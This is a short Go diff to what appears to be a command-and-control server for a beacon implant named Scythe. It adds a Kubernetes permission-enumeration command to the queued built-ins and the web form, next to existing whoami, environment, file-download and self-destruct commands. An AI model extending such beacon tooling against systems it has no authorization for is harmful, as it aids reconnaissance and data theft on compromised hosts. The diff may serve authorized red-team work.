@@ -23,9 +23,9 @@ const maxQueuedCommandLen = 8000
 // beaconSelfDestructCommand is queued for Scythe to exit on next heartbeat delivery.
 const beaconSelfDestructCommand = "sendmetojesusdog"
 
-// ScytheBuiltinCommands are single-token commands handled by Scythe’s HTTP beacon built-ins (queue exactly as shown).
-// Use "download" preset then type the host path after the word download (e.g. download C:\Windows\Temp\a.txt).
-var ScytheBuiltinCommands = []string{"whoami", "groups", "environment", "download"}
+// ScytheBuiltinCommands are commands handled by Scythe’s HTTP beacon built-ins (queue exactly as shown).
+// Most are a single token; "download" is special — type the host path after the word (e.g. download C:\Windows\Temp\a.txt).
+var ScytheBuiltinCommands = []string{"whoami", "groups", "environment", "kube-auth-can-i-list", "download"}
 
 func beaconSelectLabel(c dbconnections.BeaconClientDocument) string {
 	label := strings.TrimSpace(c.BeaconLabel)
@@ -91,7 +91,7 @@ func (s *Server) handleCommandsPage(w http.ResponseWriter, r *http.Request) {
       <label>Preset</label>
       <select id="cmdPreset">` + builtinOpts.String() + `</select>
       <label>Command</label>
-      <textarea id="cmdText" placeholder="whoami · download C:\path\file.txt · {&quot;op&quot;:&quot;upload&quot;,…}" rows="3"></textarea>
+      <textarea id="cmdText" placeholder="whoami · kube-auth-can-i-list · download C:\path\file.txt · {&quot;op&quot;:&quot;upload&quot;,…}" rows="3"></textarea>
       <button type="button" class="btn" id="queueBtn">Queue command</button>
       <p id="cmdMsg" class="cmd-inline-msg muted"></p>
     </section>
